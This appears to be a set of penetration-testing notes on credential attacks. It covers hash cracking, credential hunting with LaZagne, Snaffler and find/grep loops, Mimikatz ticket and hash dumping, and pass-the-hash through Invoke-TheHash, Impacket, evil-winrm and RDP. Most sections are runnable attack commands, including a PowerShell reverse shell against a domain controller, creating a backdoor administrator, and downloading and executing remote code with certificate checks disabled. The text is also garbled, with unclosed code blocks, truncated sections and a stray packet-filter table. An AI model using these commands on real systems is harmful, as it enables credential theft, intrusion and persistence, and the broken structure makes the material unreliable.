sudo hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt
```

But what happens if we're unable to crack a hash?

</details>

<details>
<summary><h3>Pass the Hash (PtH)</h3></summary>

We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target.

```bash
evil-winrm -i <DC IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

</details>

</details>

<details>
<summary><h2>Credential Hunting in Windows</h2></summary>

Once we gain access to a Windows machine‚Äîvia GUI or command line‚Äîcredential hunting becomes a valuable technique. It involves thoroughly searching the file system and various applications to uncover stored credentials that can be leveraged for further access or privilege escalation.

<details>
<summary><h3>Search-centric</h3></summary>

Users may store passwords in files on the system, and default credentials might also be present. Tailoring our search based on how the system is used can improve our chances of finding valuable credentials.

> What might an IT admin be doing on a day-to-day basis and which of those tasks may require credentials?

Here are some helpful key terms we can use that can help us discover some credentials:

* Passwords
* Passphrases
* Keys
* Username
* User account
* Creds
* Users
* Passkeys
* configuration
* dbcredential
*  dbpassword
* pwd
* Login
* Credentials

</details>

<details>
<summary><h3>Search tools</h3></summary>

<details>
<summary><h4>Windows Search</h4></summary>

With GUI access, it's worth using Windows Search to look for files containing relevant keywords. By default, it searches both OS settings and the file system for files and applications matching the entered terms, making it a quick way to uncover potential credential artifacts.

</details>

<details>
<summary><h4>LaZagne</h4></summary>

We can also leverage third-party tools like [LaZagne](https://github.com/AlessandroZ/LaZagne) to quickly uncover credentials stored insecurely by web browsers and other applications. LaZagne uses modular components, each designed to extract passwords from specific software.

Some of the common modules are described in the table below:

| Module     | Description                                                                                              |
|------------|----------------------------------------------------------------------------------------------------------|
| browsers   | Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera          |
| chats      | Extracts passwords from various chat applications including Skype                                         |
| mails      | Searches through mailboxes for passwords including Outlook and Thunderbird                               |
| memory     | Dumps passwords from memory, targeting KeePass and LSASS                                                  |
| sysadmin   | Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP         |
| windows    | Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more                 |
| wifi       | Dumps WiFi credentials                                                                                    |

>**NOTE:** Web browsers are some of the most interestings placed to search for credentials, due to the fact that many of them offer built-in credential storage.

>**NOTE:** In the most popular browsers, such as Google Chrome, Microsoft Edge, and Firefox, stored credentials are encrypted. However, many tools for decrypting the various credentials databases used can be found online, such as firefox_decrypt and decrypt-chrome-passwords.

It's a good practice to keep the latest [LaZagne executable](https://github.com/AlessandroZ/LaZagne/releases/) on our attack host, allowing us to quickly transfer it to the target system when needed.

**Target Machine: Run LaZagne**

```cmd
start LaZagne.exe all
```

Expected output

```cmd

<details>
<summary><h4>findstr</h4></summary>

We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

</details>

</details>

<details>
<summary><h4>Additional considerations</h4></summary>

There are countless tools and keywords available for credential hunting on Windows systems, but our approach should be guided by the system's role. A **Windows Server** may require a different strategy than a **Windows Desktop**. Being mindful of how the system is used helps us focus our search. In some cases, simply navigating and listing directories while tools run can reveal stored credentials.

Here are some other places we should keep in mind when credential hunting:

* Passwords in Group Policy in the SYSVOL share
* Passwords in scripts in the SYSVOL share
* Password in scripts on IT shares
* Passwords in web.config files on dev machines and IT shares
* Password in unattend.xml
* Passwords in the AD user or computer description fields
* KeePass databases (if we are able to guess or crack the master password)
* Found on user systems and shares
* Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint

<summary><h1>üêß Extracting Passwords from Linux Systems</h1></summary>

<details>
<summary><h2>Linux Authentication Process</h2></summary>

**Linux Authentication: PAM Architecture**

Linux systems primarily authenticate users through Pluggable Authentication Modules (PAM), a modular framework that centralizes authentication processes. Key components include:

**Core PAM Modules**

* `pam_unix.so`/`pam_unix2.so`:

    * Handle traditional Unix authentication (`/etc/passwd`, `/etc/shadow`)

    * Manage password changes and session setup

    * Default location: `/usr/lib/x86_64-linux-gnu/security`/ (Debian/Ubuntu)

**Authentication Workflow**

1. User Verification:

    * Validates credentials against system databases

    * Enforces password policies (aging, complexity)

2. Session Management:

    * Logs successful/attempted logins (`/var/log/auth.log`)

    * Applies resource limits (ulimit)

**Security Implications**

* Configuration: Defined in `/etc/pam.d/` (e.g., sshd, sudo)

* Customization: Supports LDAP/AD integration via `pam_ldap.so`

<details>
<summary><h3>Passwd file</h3></summary>

The /etc/passwd file contains information about every user on the system and is readable by all users and services. Each entry in the file corresponds to a single user and consists of seven fields, which store user-related data in a structured format. These fields are separated by colons (:). As such, a typical entry may look something like this:

```bash
john:x:1000:1000:,,,:/home/john:/bin/bash
```

| Field           | Value               |
|-----------------|---------------------|
| Username        | john                |
| Password        | x                   |
| User ID         | 1000                |
| Group ID        | 1000                |
| GECOS           | ,,,                 |
| Home directory  | /home/john          |
| Default shell   | /bin/bash           |

The most important field for our purposes in the `/etc/passwd` file is the password field, which can contain different types of entries. On very old systems, this field may hold the actual password hash, but on modern systems, password hashes are stored in /etc/shadow, which we‚Äôll examine later.

Since `/etc/passwd` is world-readable, if hashes are present here, they can be cracked by an attacker. Typically, you'll see an **x** in the password field, indicating that the actual password hash is in `/etc/shadow`.

However, if `/etc/passwd` is writable‚Äîwhich is a misconfiguration‚Äîan attacker could modify the file, such as by removing the password for the root user entirely:

```bash
head -n 1 /etc/passwd
```

Expected output

```bash
# root::0:0:root:/root:/bin/bash
```

This results in no password prompt being displayed when attempting to log in as root.

```bash
su
```

Expected output

```bash
# root@john[/john]#
```

Although the scenarios described are rare, we should still pay attention and watch for potential security gaps, as there are applications that require specific permissions fon entire folders.

</details>

<details>
<summary><h3>Shadow file</h3></summary>

To better protect password hashes, the `/etc/shadow` file was introduced. While it follows a format similar to `/etc/passwd`, its sole purpose is to securely store and manage password information. It contains the password data for all valid user accounts‚Äîif a user listed in `/etc/passwd` has no corresponding entry in `/etc/shadow`, that account is considered invalid.

The `/etc/shadow` file is only readable by users with administrative privileges, reducing the risk of unauthorized access. Each line in the file represents a user and is divided into nine fields, including the username, hashed password, and password policy information.

```bash
# john:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
```

| Field             | Value                                      |
|-------------------|--------------------------------------------|
| Username          | john                                |
| Password          | `$y$j9T$3QSBB6CbHEu...f8Ms`         |
| Last change       | 18955                                      |
| Min age           | 0                                          |
| Max age           | 99999                                      |
| Warning period    | 7                                          |
| Inactivity period | -                                          |
| Expiration date   | -                                          |
| Reserved field    | -                                          |

If the Password field contains a character such as ! or *, the user cannot log in using a Unix password. However, other authentication methods‚Äîsuch as Kerberos or key-based authentication‚Äîcan still be used. The same applies if the Password field is empty, meaning no password is required for login.
The Password field also follows a particular format, from which we can extract additional information:

```bash
# $<id>$<salt>$<hashed>
```

As we can see here, the hashed passwords are divided into three parts. The ID value specifies which cryptographic hash algorithm was used, typically one of the following:

| ID   | Cryptographic Hash Algorithm |
|------|-------------------------------|
| 1    | MD5                           |
| 2a   | Blowfish                      |
| 5    | SHA-256                       |
| 6    | SHA-512                       |
| sha1 | SHA1crypt                     |
| y    | Yescrypt                      |
| gy   | Gost-yescrypt                 |
| 7    | Scrypt                        |

Many Linux distributions, including Debian, now use yescrypt as the default hashing algorithm. On older systems, however, we may still encounter other hashing methods that can potentially be cracked.

</details>

<details>
<summary><h3>Opasswd</h3></summary>

The PAM library (pam_unix.so) can prevent users from reusing old passwords. These previous passwords are stored in the /etc/security/opasswd file. Administrator (root) privileges are required to read this file, assuming its permissions have not been modified manually.

```bash
sudo cat /etc/security/opasswd
```

Expected output

```bash
# cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

The presence of multiple cry0l1t3 entries with MD5 ($1$) hashes in the file reveals critical security concerns. 

* MD5 ($1$) is cryptographically broken (collisions since 2004)
* No salting in legacy implementations (pre-2008 Linux)

This is particularly important when identifying old passwords and recognizing patterns, as users often reuse similar passwords across multiple services or applications. Recognizing these patterns can greatly improve our chances of correctly guessing the password.

</details>

<details>
<summary><h3>Cracking Linux Credentials</h3></summary>

Once we have root access on a Linux system, we can extract user password hashes and attempt to crack them to recover plaintext passwords. A useful tool for this is **[unshadow](https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c)**, included with John the Ripper (JtR). It combines the `/etc/passwd` and `/etc/shadow` files into a single file format suitable for cracking.

```bash
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
sudo unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

This "unshadowed" file can now be attacked with either JtR or hashcat

```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked
```

Display the results

```bash
cat /tmp/unshadowed.cracked
```

Expected output

```bash
# $6$EBOM5vJAV1TPvrdP$LqsLyYkoGzAGt4ihyvfhvBrrGpVjV976B3dEubi9i95P5cDx1U6BrE9G020PWuaeI6JSNaIDIbn43uskRDG0U/:mariposa

<summary><h2>Credential Hunting in Linux</h2></summary>

Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes.

We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target.

There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:

* **Files** including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
* **History** including logs, and command-line history
* **Memory** including cache, and in-memory processing
* **Key-rings** such as browser stored credentials

Enumerating all these categories will allow us to increase the probability of successfully finding out - with some ease - credentials of existing users on the system.

Every environment is different, so our approach should adapt to the specific circumstances. Most importantly, we must understand how the system functions, its purpose, and its role within the broader business logic and network. Keeping this big-picture perspective helps guide effective and context-aware decision-making.

<details>
<summary><h3>Files</h3></summary>

A core principle of Linux is that everything is a file, so it's essential to apply this mindset when searching for valuable data. We should identify and inspect files based on specific categories relevant to our objectives. Key file types to examine include:

* Configuration files
* Databases
* Notes
* Scripts
* Cron jobs
* SSH keys

**Searching for configuration files**

Configuration files (`.config`, `.conf`, `.cnf`) are the core of the functionality of services on Linux distributions.

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

**Searching configuration files for three words (user, password, pass) in each file with the file extension `.cnf`**

Often they even contain credentials that we will be able to read.

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

**Searching for databases**

We can apply this simple search to the other file extensions as well.

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

**Searching for notes**

These often include lists of many different access points or even their credentials.

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

**Searching for scripts**

Scripts are files that often contain highly sensitive information and processes.

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

**Enumerating cronjobs**

Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs.

```bash
cat /etc/crontab
```

```bash
ls -la /etc/cron.*/
```

**Enumerating cronjobs**

We are interested in the files that store users' command history and the logs that store information about system processes.

```bash
tail -n5 /home/*/.bash*
```

**Enumerating log files**

Here are some strings we can use to find interesting content in the logs:

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

An essential concept of Linux systems is log files that are stored in text files. The entirety of log files can be divided into four categories:

* Application logs
* Event logs
* Service logs
* System logs

Many different logs exist on the system:

| File                  | Description                                      |
|-----------------------|--------------------------------------------------|
| `/var/log/messages`   | Generic system activity logs                     |
| `/var/log/syslog`     | Generic system activity logs                     |
| `/var/log/auth.log`   | (Debian) All authentication related logs         |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs  |
| `/var/log/boot.log`   | Booting information                              |
| `/var/log/dmesg`      | Hardware and drivers related information and logs|
| `/var/log/kern.log`   | Kernel related warnings, errors and logs         |
| `/var/log/faillog`    | Failed login attempts                            |
| `/var/log/cron`       | Information related to cron jobs                 |
| `/var/log/mail.log`   | All mail server related logs                     |
| `/var/log/httpd`      | All Apache related logs                          |
| `/var/log/mysqld.log` | All MySQL server related logs                    |

| ------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| `ip.addr == 56.48.210.13`                         | Filters packets with a specific IP address.                                                     |
| `tcp.port == 80`                                  | Filters packets by port (e.g., HTTP traffic).                                                   |
| `http`                                            | Filters for all HTTP traffic.                                                                   |
| `dns`                                             | Filters DNS traffic‚Äîuseful for monitoring domain resolution.                                    |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0`        | Filters SYN packets used in TCP handshakes, helpful for detecting scans or connection attempts. |
| `icmp`                                            | Filters ICMP packets (e.g., ping), useful for recon and troubleshooting.                        |
| `http.request.method == "POST"`                   | Filters HTTP POST requests; these may contain credentials if sent over unencrypted HTTP.        |
| `tcp.stream eq 53`                                | Filters a specific TCP stream, helpful for tracking conversations between hosts.                |
| `eth.addr == 00:11:22:33:44:55`                   | Filters packets to/from a specific MAC address.                                                 |
| `ip.src == 192.168.24.3 && ip.dst == 56.48.210.3` | Filters traffic between two specific IPs, useful for focused host communication analysis.       |

One way to do this is by using a display filter such as http contains "passw". Alternatively, you can navigate to Edit > Find Packet and enter the desired search query manually. For example, you might search for packets containing the string "passw".

<summary><h2>Credential Hunting in Network Shares</h2></summary>

Network shares in corporate environments often contain sensitive data inadvertently left exposed. Effective credential hunting requires a methodical approach to identify and extract valuable authentication data.

**Common credential patterns**

As a quick reminder, here are some general tips:

* Look for keywords within files such as `passw`, `user`, `token`, `key`, and `secret`.
* Search for files with extensions commonly associated with stored credentials, such as `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, and `.bat`.
* Watch for files with "interesting" names that include terms like `config`, `user`, `passw`, `cred`, or `initial`.
* If you're trying to locate credentials within the `DOMAINNAME.LOCAL` domain, it may be helpful to search for files containing the string `DOMAINNAME\`.
* Keywords should be localized based on the target; if you are attacking a German company, it's more likely they will reference a `Benutzer` than a `User`.
* Pay attention to the shares you are looking at, and be strategic. If you scan ten shares with thousands of files each, it's going to take a signifcant amount of time. Shares used by IT employees might be a more valuable target than those used for company photos.

<summary><h3>Hunting from Windows</h3></summary>

<details>
<summary><h4>Snaffler</h4></summary>

[Snaffler](https://github.com/SnaffCon/Snaffler) is a C# program that, when run on a domain-joined machine, automatically identifies accessible network shares and searches for interesting files. You can get the lateste executable for Windows [here](https://github.com/SnaffCon/Snaffler/releases).

**Usage**

```cmd
snaffler.exe -s -o snaffler.log
```
```cmd
snaffler.exe -s -i C:\ -o snaffler.log
```

Once you find a useful share, you can mount it to explore its files:

PowerShell:

```powershell
net use Z: \\<IP>\<SHARE_NAME> /user:<DOMAIN>\<USER> <PASSWORD> /persistent:no
```

| Option | Description | Example/Values |
|--------|-------------|----------------|
| `-o`   | Output results to a file | `-o C:\users\thing\snaffler.log` |
| `-s`   | Enable real-time stdout output | `-s` |
| `-v`   | Verbosity level | `Trace`, `Debug`, `Info` (default), `Data` |
| `-m`   | Output directory for copying found files | `-m C:\captured_files` |
| `-l`   | Max file size to copy (bytes) | Default: `10000000` (10MB) |
| `-i`   | Disable discovery; requires directory path | `-i \\server\share` |
| `-n`   | Disable computer discovery; specify hosts | `-n 192.168.1.100` or `-n hosts.txt` |
| `-y`   | TSV-formatted output | `-y` |
| `-b`   | Skip LAIM rules (0-3) | `-b 2` (medium filtering) |
| `-f`   | Find shares via DFS only | `-f` |
| `-a`   | List shares without file enumeration | `-a` |
| `-u`   | Pull interesting AD accounts for searches | `-u` |
| `-d`   | Target domain for computer discovery | `-d <DOMAIN>` |
| `-c`   | Domain controller for queries | `-c DC01.<DOMAIN>` |
| `-r`   | Max file size to search (bytes) | Default: `500000` (500KB) |
| `-j`   | Context bytes around found strings | `-j 200` (200 bytes) |
| `-z`   | Path to config file | `-z config.toml` or `-z generate` |
| `-t`   | Log output format | `plain` (default) or `json` |
| `-x`   | Max threads (minimum 4) | `-x 8` |
| `-p`   | Custom rules directory (.toml files) | `-p C:\custom_rules` |

> **NOTE:** The real power is in Snaffler's ability to chain multiple rules together, and even create branching chains. This allows us to use "cheap" rules like checking file names and extensions to decide when to use "expensive" rules like running regexen across the contents of files, parsing certs to see whether they contain private keys, etc.

**Rules**

Default Rules:

Snaffler comes with a set of default rules baked into the `.exe`. You can see them in `./Snaffler/SnaffRules/DefaultRules`.

Custom Rules:

*Option 1:* Edit or replace the rules in the `DefaultRules` directory, then build a fresh Snaffler. The `.toml` files in that dir will get baked into the `.exe` as resources, and loaded up at runtime whenever you don't specify any other rules to use.

*Option 2:* Make a directory and stick a bunch of your own rule files in there, then run Snaffler with `-p .\path\to\rules`. Snaffler will parse all the `.toml` files in that directory and use the resulting ruleset. This will also work if you just have them all in one big `.toml` file.

<summary><h4>PowerHuntShares</h4></summary>

Another tool that can be used is [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares), a PowerShell script that doesn't necessarily need to be run on a domain-joined machine. One of its most useful features is that it generates an HTML report upon completion, providing an easy-to-use UI for reviewing the results.

The script can be found in the Github repo or [`here`](../scripts/passwords/PowerHuntShares.psm1).

**Setup Commands**

Below is a list of commands that can be used to load PowerHuntShares into your current PowerShell session. Please note that one of these will have to be run each time you run PowerShell is run. *It is not persistent.*

*Option 1:* 

1. Bypass execution policy restrictions

```powershell
Set-ExecutionPolicy -Scope Process Bypass
```

2. Import module that exists in the current directory

```powershell
Import-Module .\PowerHuntShares.psm1
```

*Option 2:* 

1. Reduce SSL operating level to support connection to github

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
[Net.ServicePointManager]::SecurityProtocol =[Net.SecurityProtocolType]::Tls12
```

2. Download and load PowerHuntShares.psm1 into memory

```powershell
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerHuntShares/main/PowerHuntShares.psm1")
```

**Usage**

<summary><h2>Pass the Hash (PtH)</h2></summary>

A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

* Dumping the local SAM database from a compromised host.
* Extracting hashes from the NTDS database (`ntds.dit`) on a Domain Controller.
* Pulling the hashes from memory (`lsass.exe`).

<details>
<summary><h3>Introduction to Windows NTLM Authentication</h3></summary>

NTLM (New Technology LAN Manager) is a legacy security protocol used by Microsoft Windows for authentication. It employs a challenge-response mechanism to verify user identities without transmitting plaintext passwords, providing single sign-on (SSO) capabilities.

**Key Characteristics**

* Still in Use: Maintained for backward compatibility with legacy systems.

* Replaced by Kerberos: Windows 2000+ domains default to Kerberos, but NTLM persists in many environments.

**Why NTLM Remains Relevant**

* Legacy system dependencies

* Fallback mechanism when Kerberos fails

* Still enabled in many Active Directory environments

</details>

<details>
<summary><h3>Pass the Hash with Mimikatz (Windows)</h3></summary>

The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password.

* **USER** - The user name we want to impersonate.
* **HASH_TYPE** - NTLM or rc4.
* **HASH** - NTLM or rc4 hash of the user's password.
* **DOMAIN** - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).

**Start Mimikatz as Adminitrator**

```cmd
mimikatz.exe
```

**Get the hashes**

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Run a CMD as th desired user**

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /<HASH_TYPE>:<HASH> /domain:<corp.rth> /run:cmd.exe" exit
```

</details>

<details>
<summary><h3>Pass the Hash with PowerShell Invoke-TheHash (Windows)</h3></summary>

Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB.

When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

* **Target** - Hostname or IP address of the target.
* **Username** - Username to use for authentication.
* **Domain** - Domain to use for authentication. *This parameter is unnecessary with local accounts or when using the @domain after the username.*
* Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
* **Command** - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

<details>
<summary><h4>Invoke-TheHash with SMB</h4></summary>

**Import the module**

```powershell
Import-Module .\Invoke-TheHash.psd1
```

**Create a new user and add it to the Adminitrators group**

```powershell
Invoke-SMBExec -Target <IP> -Domain <corp.rth> -Username <USER> -Hash <NTLM_HASH> -Command "net user <NEW_USER> <NEW_PASSWORD> /add && net localgroup administrators <NEW_USER> /add" -Verbose
```

**Expected output**

```powershell
VERBOSE: [+] <corp.rth>\<USER> successfully authenticated on <IP>
VERBOSE: <corp.rth>\<USER> has Service Control Manager write privilege on <IP>
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on <IP>
VERBOSE: [*] Trying to execute command on <IP>
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on <IP>
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on <IP>
```

We can also get a reverse shell connection in the target machine.

</details>

<details>
<summary><h4>Netcat listener</h4></summary>

**Start Netcat**

```cmd
.\nc.exe -lvnp <PORT>
```

**Generate the payload**

To create a simple reverse shell using PowerShell, we can visit [revshells.com](https://www.revshells.com/), set our IP and port, and select the option *PowerShell #3 (Base64)*.

To perform Pass-the-Hash (PtH) execution of a PowerShell reverse shell on the target DC01, use the following syntax with Invoke-TheHash:

**Import the module**

```powershell
Import-Module .\Invoke-TheHash.psd1
```

**Excute the reverse shell**

```powershell
Invoke-WMIExec -Target DC01 -Domain <corp.rth> -Username <USER> -Hash <NTLM_HASH> -Command "powershell -e <BASE64_PAYLOAD>"
```

The result is a reverse shell connection from the DC01 host.

</details>

</details>

<details>
<summary><h3>Pass the Hash with Impacket (Linux)</h3></summary>

We'll use Impacket's `psexec.py` to execute commands on the target system.

```bash
impacket-psexec Administrator@<IP> -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Impacket‚Äôs PsExec uploads a small helper (RemComSvc) to a writable admin share (e.g., ADMIN$ or C$), then creates and runs a Windows service using Service Control Manager. This requires both an admin account and write permission to the share.

> **NOTE:** If the share isn't writable or you aren‚Äôt an administrator, the attack will fail (you‚Äôll see errors like ‚Äúshare 'ADMIN$' is not writable‚Äù)

There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

* [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
* [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
* [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

</details>

<details>
<summary><h3>Pass the Hash with NetExec (Linux)</h3></summary>

NetExec is a powerful post-exploitation tool designed to automate security testing across large Active Directory environments. Its capabilities include:

* **Credential Validation**: Tests authentication across network hosts to identify systems where provided credentials grant local admin access
* **Password Spraying**: Attempts single login attempts across multiple hosts using provided credentials
* **Lockout Avoidance**: Supports local account testing to minimize domain account lockout risks

> **NOTE:** Always verify the target domain's account lockout policy before conducting password spraying tests.

**Start netexec**

```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H <HASH>

<summary><h3>Pass the Hash with evil-winrm (Linux)</h3></summary>

Evil-WinRM provides an alternative to SMB for Pass-the-Hash (PtH) attacks when:

* SMB ports are blocked, filtered, or shares aren‚Äôt writable
* You don‚Äôt have admin rights over SMB
* PowerShell Remoting (WinRM) is enabled (TCP 5985/5986)

Evil‚ÄëWinRM leverages WinRM (PowerShell Remoting) over HTTP(S) and doesn‚Äôt require SMB writable shares or service creation.

As long as the account belongs to Remote Management Users or equivalent, you can authenticate using an NTLM hash and spawn a remote PowerShell session.

```bash
evil-winrm -i <IP> -u <USER> -H <HASH>
```

**Expcted output**

```bash
# Evil-WinRM shell v3.3

# Info: Establishing connection to remote endpoint

# *Evil-WinRM* PS C:\Users\Administrator\Documents>
```

</details>

<details>
<summary><h3>Pass the Hash with RDP (Linux)</h3></summary>

We can perform an RDP PtH attack to gain GUI access to the target system using tools like *xfreerdp*.

The target host must have Restricted Admin Mode enabled. If disabled (default configuration), the attack will fail with the error:

> Account restrictions are preventing this user from signing in. For example: blank passwords aren't allowed, sign-in times are limited, or a policy restriction has been enforced.

This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of `0`. It can be done using the following command:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use *xfreerdp* with the option /pth to gain RDP access:

```bash
xfreerdp  /v:<IP> /u:'<USER>' /pth:<HASH>
```

</details>

<details>
<summary><h3>UAC limits Pass the Hash for local accounts</h3></summary>

User Account Control (UAC) imposes limitations on remote administration capabilities for local user accounts. This behavior is controlled by the following registry key:

Registry Key:
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`

Configuration Options:

| Value | Effect |
|-------|--------|
| 0 (Default) | Only the built-in local Administrator account (RID-500) can perform remote administration tasks |
| 1 | All local administrator accounts can perform remote administration |

> **Note:** There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

<summary><h2>Pass the Ticket (PtT)</h2></summary>

<details>
<summary><h3>PtT from Windows</h3></summary>

<details>
<summary><h4>Kerberos Protocol Refresher</h4></summary>

Kerberos is a ticket-based authentication system designed to avoid sharing user passwords with every service. Instead of sending passwords, the system stores authentication tickets locally and provides each service only with the specific ticket it requires. This design ensures that tickets cannot be reused for other purposes.

* The **Ticket Granting Ticket (TGT)** is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or **TGS**.
* The **Ticket Granting Service (TGS)** is requested by users who want to use a service. These tickets allow services to verify the user's identity.

To obtain a **TGT**, the user authenticates to the domain controller by encrypting the current timestamp using their password hash. Since the domain controller knows the user's password hash, it can decrypt the timestamp to verify the user‚Äôs identity. Upon successful validation, the domain controller issues a **TGT**. From this point onward, the user does not need to use their password again during the session.

When the user wants to access a specific service‚Äîsuch as an MSSQL database‚Äîthey request a **TGS** from the **Key Distribution Center (KDC)** using their **TGT**. The **TGS** is then presented to the MSSQL server to authenticate the user and authorize the connection.

</details>

<details>
<summary><h4>Pass the Ticket (PtT) attack</h4></summary>

We need a valid Kerberos ticket to perform a Pass the Ticket (PtT) attack. It can be:

* Service Ticket (TGS) to allow access to a particular resource.
* Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

Before we perform a **Pass the Ticket (PtT)** attack, let's see some methods to get a ticket using **Mimikatz** and **Rubeus**.

</details>

<details>
<summary><h4>Scenario</h4></summary>

During a penetration test, assume we successfully phished a user and gained access to their workstation. After escalating privileges, we now hold local administrator rights on the compromised machine.

With this level of access, we can interact with the Kerberos authentication mechanism in several ways‚Äîeither by extracting existing tickets or generating new ones to escalate privileges, impersonate users, or move laterally across the domain.

Below, we explore the most common techniques for obtaining and forging Kerberos tickets.

</details>

<details>
<summary><h4>Harvesting Kerberos tickets from Windows</h4></summary>

Windows processes Kerberos tickets via the LSASS (Local Security Authority Subsystem Service) process. To extract any tickets, you need to interface directly with LSASS. As a standard user, you can only retrieve Kerberos tickets associated with your own session. However, once you've elevated to local administrator, you have full access to all tickets stored in LSASS memory ‚Äî including other users' TGTs and TGS tickets.

> **Note:** To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

<details>
<summary><h5>Mimikatz - Export tickets</h5></summary>

**Start Mimikatz as Adminitrator**

```cmd
mimikatz.exe
```

**Export tickets**

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # exit
```

**Verify the new file**

```cmd
dir *.kirbi
```

**Expected output**

```cmd
Directory: c:\Users\Public

Mode                LastWriteTime         Length Name

```

The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.

> **NOTE:** Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.

<details>
<summary><h4>Pass the Key / OverPass the Hash</h4></summary>

